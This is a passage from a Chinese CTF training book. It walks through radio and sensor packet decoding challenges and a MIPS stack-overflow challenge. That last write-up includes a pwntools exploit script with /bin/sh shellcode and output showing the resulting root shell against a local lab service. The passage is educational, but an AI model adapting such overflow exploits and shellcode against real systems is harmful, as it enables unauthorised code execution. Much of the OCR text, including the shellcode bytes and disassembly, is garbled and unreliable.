lefti = i;
else
if(left-outsig(i)>0.5)
ans = [ans,0];
left=0;
lefti =i;
else
if (i-lefti>90)
---
## Page 1130
CTF特训营：技术详解、解题方法与
30.4ACTF2016:4GRadio1130/1144
ans=[ans,ans(end)];
lefti =i;
end
end
end
end
最后，对得到的二进制位进行曼彻斯特解码。0-1跳变表示0，
1-0跳变表示1。保存后可以得到一张图片。图片上是个二维码，扫描
后会指向百度网盘的网址，链接地址为http://pan.baidu.com/
s/1mgAA0zQ，密码为yiw9，下载下来是一个摄像头的固件，要求得
到管理员admin的密码，binwalk后发现是JFFS2filesystem。这里使用
28.4节中提到的mtd-utils挂载分区，最后在www目录下的system.ini中
找到admin的密码。
---
## Page 1131
CTF特训营：技术详解、解题方法与
30.5UCTF2016资格赛：传感器（1）（2）
1131/1144
30.5UCTF2016资格赛：传感器(1)(2)
1.传感器（1）
题目如图30-36所示。
传感器1
分值：100分
类型：Misc
未解答
题目：5555555595555A65556AA696AA666666955
这是某压力传感器无线数据包解调后但未解码的报文（hex）
已知其ID为0xFED31F，请继续将报文完整解码，提交hex。
tips：flag是flag（破译出的明文）
提示1：曼联
Flag
提交
图30-36传感器1题目文本
首先对结果进行曼彻斯特解码，对于每个字节，是按照LSBFirst
的方式来解码。
对于RF调制来说，都是以字节为一个符号进行发送的。这里有
两种发送方式：LSBFirs和MSBFirst。注意，不要直接将解调出来
---
## Page 1132
CTF特训营：技术详解、解题方法与
30.5UCTF2016资格赛：传感器（1）（2）
1132/1144
的二进制位整个倒过来。解码如下：
5555555595555A65556AA696AA6666666955→转为比特
0101010101010101010101010101010110010101010101010101101001100101010
1010101101010101001101001011010101010011001100110011001100110011010
0101010101
注意，LSBFirs指的是每个字节，并不是上面的O1串整个倒过来
这是一个容易出错的点！
比特数据按曼彻斯特解码即可。
01表示1，10表示0——因为曼彻斯特编码一般有2种，01表示1
还是0要尝试之后才能确定。
000000000000000010000000001101000000011111011001111101010
101010101100000—这里01表示0，10表示1。
111111111111111101111111110010111111100000100110000010101
010101010011111——这里01表示1，10表示0。
---
## Page 1133
CTF特训营：技术详解、解题方法与
30.5UCTF2016资格赛：传感器（1）（2）
1133/1144
111111111111111101111111110010111111100000100110000010101
010101010011111—
比特8为一组
111111111111111111111110110100110001111101100100010100000
101010111111001
每字节反序。
OxFF
OxFF
OxFE
0xD3
Ox1F
0x64
0x50
0x55
0xF9
即flag为FFFFFED31F645055F9，与题目中提到的传感器ID为
OxFED31F相符。
2.传感器（2）
题目如图30-37所示。
---
## Page 1134
CTF特训营：技术详解、解题方法与
30.5UCTF2016资格赛：传感器（1）（2）
1134/1144
传感器2
分值：300分
类型：Misc
未解答
题目：现有某ID为0xFED31F的压力传感器，已知测得压力为45psi时的未
解码报文为：
5555555595555A65556A5A96AA666666A955
压力为30psi时的未解码报文为：
5555555595555A65556A9AA6AA6666665665
请给出ID为0xFEB757的传感器在压力为25psi时的解码后报文，提
交hex.
注：其他测量读数与上一个传感器一致，
tips：flag是flag（破译出的明文）
Flag :
提交
图30-37传感器2题目文本
传感器2的解码思路与传感器1相同，但本题的考察点为数据包
diff的方法。先解码：
FFFFFED31F635055F8
8--45psi
FFFFFED31F425055D7
--30psi
抽取不同的部分：
FFFFFED31F635055F8
FFFFFED31F425055D7
---
## Page 1135
CTF特训营：技术详解、解题方法与
30.5UCTF2016资格赛：传感器（1）（2）1135/1144
注意，加粗的部分不同，我们接下来要重点分析。
FED31F:ID
0x63和0x42：压力
OxF8口0xD7:checksum
25psi时候的报文是什么？0x63/0x42=1.545/30=1.525psi对应多
少只需进行同比例缩放即可。checksum怎么办？0xF8=（OxFE
+0xD3+0x1F+0x63+0x50+0x55)&0xFF;0xD7=(0xFE+0xD3+0x1F
+0x42+0x50+0x55）&0xFF。为什么前两个FF不用加进去？具体解释
如下。
FFFF其实对应于曼彻斯特编码为0101010101串，这在无线电传
输领域是有实际物理意义的，称为preamble，用于提供接收方同步时
钟信号，校准相位。这部分对实际传输的内容是没有影响的。
---
## Page 1136
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1136/1144
30.6UCTF2016资格赛：Add
首先使用fie命令对题目所提供的文件进行识别，命令如下：
[root@kali:~/Xman/hacking-mips]%fileadd
add:ELF32-bitLSBexecutable,MIPS,MIPS-Iversion1（SYSV),dynamically
linked,interpreter/lib/ld.so.1,forGNU/Linux2.6.18,BuildID[sha1]=
2bbfd9dd356de4e12870defaa67f386c360fd9c3,not stripped
本题为mipsel的可执行程序，因此首先需要搭建调试环境，调试
环境已在27.6节中给出，要想调试本题，需要使用debian-mipsel的虚
拟机。通过checksec脚本可以发现，本题开启了NX，但在27.1节中
已经提到mips硬件上并不支持NX，因此开不开NX对本题的shellcode
执行并不会产生影响。
shellcode可以使用msfvenom生成，为了调试方便，将虚拟机的
5555端口转发出来，并在虚拟机内使用socat创建一个服务器，代码
如下：
socatTCP4-LISTEN:5555,reuseaddr,forkEXEC:/add
这是一个计算器程序，运行后的效果如图30-38所示
---
## Page 1137
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1137/1144
root@debian-mipsel:~#./add
[calc]
Type 'help' for help.
help
Type'exit'to exit.
Input2numbersjustlike:
12
12
1+2=3
图30-38计算器运行效果
运行效果并不容易分析，但经过测试很快就能发现该程序存在栈
溢出漏洞，如图30-39所示。溢出长度为112
同时，利用27.8节中提到的反编译网站，可以得到图30-40所示
的代码。
从一开始就使用了确定的随机数种子，接着，在程序中有一处比
较，当输入等于该随机数时，会泄露Buffer的地址，如图30-41所示。
---
## Page 1138
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1138/1144
至此，已经可以确定攻击代码的位置以及如何控制程序执行流程
了，接下来编写exp脚本就非常容易了，本题的利用脚本具体如下：
rootedebian-mipsel:-# gdb add
GNU gdb(GDB)7.4.1-debian
Copyright（C)zo12Free SoftwareFoundation，Inc.
License GPLv3+:GUN GPLversion 3or later http://gnu.org/Licenses/gp1.html>
There is NO WARRANTY， to the extent permitted by law.Type“show copying”
This is free software:you are free to change and redistribute it.
and“show warranty”for details.
This GDB was configured as “mipsel-linux-gnu*
For bug reporting instructions,please see:
...
Reading symbols from/root/add...done.
(gdb）r
Starting program:/root/add
[calc]
Type “help′for help.
3Ad4Ad5Ad6Ad7Ad8Ad9Ae@Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae91
Error!
Input 2 numbers just 1ike:
12
0+1=1
Exiting...
exit
ex64413764 in ??O
Program received signal SIGSEGV,Segmentation foult.
(gdb)
图30-39程序存在栈溢出漏洞
---
## Page 1139
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1139/1144
int main（int argc,char **argv)(
char v1[64];
char str[10];
int32_tv2://0x410ea4
int32_tv3;//0x410eb4
int32_tstream;//0x4008b0
setvbuf((struct struct
IO_FILE *)stream，NULL，2，O);
puts（"[calc]");
puts("Type
'help'
for
help.");
srand（0x123456);
int32_tv4=
（int32_t）&v1;//0x40091c1
int32_tv5=rand()://0x40091c
sprintf(str,
"%d"，v5）;
int32_tv6=128;//0x400978
int32_tv7=v4;//0x40091c_18
//branch
->
0x400978
while （true)
int32_tv8=v60x400984
while（true）(
//0x400984
int32_tv11;//0x400984
（（int32t（*）（））v11）（）:
int32_tv12://
0x4009c0
int32_t
v13;
bp+111
int32_t
v14;
//
0x400abc 13
int32 t
v15;
//
0x400abc_14
int32_t
★
v16;
//
0x400abc_15
int32t
v17;
//
0x400abc_16
if（v8<0）{
v13=v10;
v16=v17;
lab_0x400ad4_2:
/70x400ad4
图30-40题目程序反编译后的代码
---
## Page 1140
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1140/1144
jalr
1s2
fnd Lirk Regi
r_s8（$sp)
 Load srd
bqz
$t9,
rintt
# Lead aderess
三
to
a1.
5s1
Sap.
ar_s($sp)= Lead uerd
s2,
ealate
# Lead Upper
420018:
$t9,
puts
8 Load aderess
: Load sderess
asch Always
xitlotxit
图30-41
漏洞触发比较位置
#/usr/bin/env python
from pwn import *
p= remote(“127.0.0.1",5555)
buf = 
buf+="x66lx06lx06lx24\xffxfflxd0lx04\xfflxfx06\x281xe0"
buf+=“xfflxbdx27x011x10lxe4\x27x1fxf0lx84x24lxe8lxff
buf+=“xa4lxaflxeclxfflxa0lxaflxe8\xfflxa5\x27xablx0flx02
buf+="x24lx0clx01lx01lx01\x2fx62lx69/x6elx2fx73lx68lx00"
payload='A*8+buf
whilelen(payload）<112:
payload+=x00
p.send("2057561479)n")
p.recvuntil("was")
data =p.recvuntil("n")[:-1]
baseaddr=int（data,16）
print"baseaddr=",hex(baseaddr)
shellcodeaddr=baseaddr+8
---
## Page 1141
CTF特训营：技术详解、解题方法与
30.6UCTF2016资格赛：Add
1141/1144
data =payload+p32(shellcodeaddr) +“1\n"
p.send(data)
p.send("exit\in")
p.interactive()
最终即可获取shell，如图30-42所示。
[root@kali:~/Xman/hacking-mips]%./exp.py
[+]Openingconnection to127.0.0.1onport5555:Done
baseaddr=0x7fa9ebd4
[*]Switching tointeractive mode
Error!
Input2numbersjustlike:
12
Exiting...
$id
uid=-（root)gid=0（root)groups=0（root)
$
图30-42题目获取shell后的效果图
以上题目均已被JarvisOJ收录。欢迎大家登录JarvisOJ：https://
wwwjarvisoj.com进行练习，笔者也会不定期更新一些高质量题目以
供大家练习。
---
## Page 1142
CTF特训营：技术详解、解题方法与
本管小结1142/1144
本篇小结
在本篇中，我们学习了loT的基本概念和目前CTF比赛中常见的
oT赛题以及oT固件逆同分析的技巧，最后还进行了实例赛题的讲解
相信读者读完能够对loT相关赛题有一个整体的感受。loT范畴广阔
受限于篇幅，对于一本CTF比赛指导教材，不可能涵盖过于专业艰深
的细节内容。
本书旨在帮助读者针对性地掌握一些解题技巧，更快入门和了解
oT相关赛题。当然，有兴趣的读者可以参考其他相关书籍作为补
充。
最后，众所周知没有任何一本书是完美的。所以，若读者发现有
什么错误或者更好的解题方法，也欢迎指正和交流。
---